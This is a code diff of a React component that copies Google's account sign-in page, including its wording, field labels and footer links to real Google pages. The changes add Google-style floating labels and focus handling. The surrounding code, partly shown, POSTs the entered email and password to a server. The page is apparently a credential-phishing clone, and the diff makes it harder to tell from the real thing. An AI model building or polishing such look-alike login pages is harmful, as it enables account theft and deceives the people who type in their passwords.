@@ -21,6 +21,35 @@ export default function Home() {
   const [isChecked, setChecked] = useState(false)
   const [LoadingAnimation, setLoadingAnimation] = useState(false)
 
+  const [emailFocus, setEmailFocus] = useState(false)
+  const [passFocus, setPassFocus] = useState(false)
+
+
+  const handelFocusEmail = () => {
+    setEmailFocus(true)
+  }
+  const handelBlurEmail = () => {
+    if (Email !== "") {
+      setEmailFocus(true)
+    }
+    else {
+      setEmailFocus(false)
+    }
+  }
+
+  const handelFocusPass = () => {
+    setPassFocus(true)
+  }
+  const handelBlurPass = () => {
+    if (Pass !== "") {
+      setPassFocus(true)
+    }
+    else {
+      setPassFocus(false)
+    }
+  }
+
+
   const handelEmailChange = (event) => {
     setEmail(event.target.value)
 
@@ -81,7 +110,7 @@ export default function Home() {
         "Pass": Pass
       }),
     })
-      .then((response) =>{})
+      .then((response) => { })
       .then((data) => {
         console.log('Success:', data);
       })
@@ -135,11 +164,15 @@ export default function Home() {
                   <p className="leading-normal">Use your Google Account</p>
                 </div>
                 <form onSubmit={handelEmailButton} className="my-8">
-                  <div className="relative mb-2">
-                    <input onChange={handelEmailChange} id="email" className="w-full rounded px-3 border border-gray-300 py-3 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" type="email" autoFocus placeholder='Enter your Email' required />
-                    {/* <label for="email" className="label absolute mt-2 ml-3 leading-tighter text-gray-600 text-base cursor-text">Email or phone</label> */}
+                  <div className="relative mb-2 ">
+                    <input onChange={handelEmailChange} onFocus={handelFocusEmail} onBlur={handelBlurEmail} id="email" className="w-full absolute rounded px-3 border border-gray-300 py-3 focus:border-blue-700 focus:bg-white focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" type="email" autoFocus required />
+                    <label for="email" className={`label absolute px-1 mt-3 ml-3 leading-tighter cursor-text duration-200  font-medium ${emailFocus ? "-translate-y-[100%] bg-white text-blue-600 text-base" : "-translate-y-[0%] text-gray-600 bg-transparent text-lg"}`}>Email or phone</label>
                   </div>
-                  <div className="space-y-9">
+
+                  <div className="space-y-9 ">
+                    <div>
+                      <a className="md:text-sm font-bold text-blue-500" href="#">.</a>
+                    </div>
                     <div>
                       <a className="md:text-sm font-bold text-blue-500" href="https://www.google.com">Forgot email?</a>
                     </div>
@@ -153,6 +186,7 @@ export default function Home() {
                     </div>
                   </div>
                 </form>
+
               </div>
             </div>
           </section>
@@ -171,16 +205,21 @@ export default function Home() {
                     <span> <FontAwesomeIcon icon={faChevronDown} /> </span>
                   </div>
                 </div>
-                <form onSubmit={handelPassButton} className="my-8">
-                  <div className="relative mb-2">
-                    <input onChange={handelPassChange} id="pass" type={PassType} className="w-full rounded px-3 border border-gray-300 p-3 focus:border-blue-700 focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" autoFocus placeholder='Enter your password' required />
+                <form onSubmit={handelPassButton} className="my-8 ">
+                  <div className="relative mb-2 ">
+                    <input onChange={handelPassChange} onFocus={handelFocusPass} onBlur={handelBlurPass} id="email" className="w-full absolute rounded px-3 border border-gray-300 py-3 focus:border-blue-700  focus:bg-white focus:ring-1 focus:ring-blue-700 focus:outline-none input active:outline-none" type={PassType} autoFocus required />
+                    <label for="email" className={`label absolute px-1 mt-3 ml-3 leading-tighter cursor-text duration-200  font-medium ${passFocus ? "-translate-y-[100%] bg-white text-blue-600 text-base" : "-translate-y-[0%] text-gray-600 bg-transparent text-lg"}`}>Enter your password</label>
                   </div>
-                  <div className="space-y-20">
+
+                  <div className="space-y-16">
+                    <div>
+                      <div className='flex gap-4 m-0'>
+                      </div>
+                    </div>
                     <div>
                       <div className='flex gap-4'>
-                        <input onClick={togglePass} type="checkbox" name="pass" className='w-5 border-4' checked={isChecked} />
+                        <input onClick={togglePass} type="checkbox" name="pass" className='w-5 border-4 cursor-pointer' checked={isChecked} />
                         <p onClick={togglePass} className="text-lg md:text-base cursor-pointer">Show Password</p>
-
                       </div>
                     </div>
 
@@ -196,7 +235,7 @@ export default function Home() {
         </div>
         <div className="flex my-5 md:p-0 p-8 w-full ">
           <ul className="flex justify-between w-full px-1 flex-wrap ">
-            <li><a className='flex justify-between items-center gap-8' href="https://google.com" target="_blank" rel="noopener noreferrer"> English (United States) <span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-caret-down-fill" viewBox="0 0 16 16"> <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z" /> </svg></span></a></li>
+            <li><a className='flex justify-between items-center gap-8' href="#" target="_blank" rel="noopener noreferrer"> English (United States) <span><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-caret-down-fill" viewBox="0 0 16 16"> <path d="M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z" /> </svg></span></a></li>
             <li><a href="https://support.google.com/accounts?hl=en&visit_id=638096372844359640-3440594032&rd=2&p=account_iph#topic=3382296" target="_blank" rel="noopener noreferrer"> Help</a></li>
             <li><a href="https://policies.google.com/privacy?gl=BD&hl=en" target="_blank" rel="noopener noreferrer"> Privacy</a></li>
             <li><a href="https://policies.google.com/terms?gl=BD&hl=en" target="_blank" rel="noopener noreferrer"> Terms</a></li>
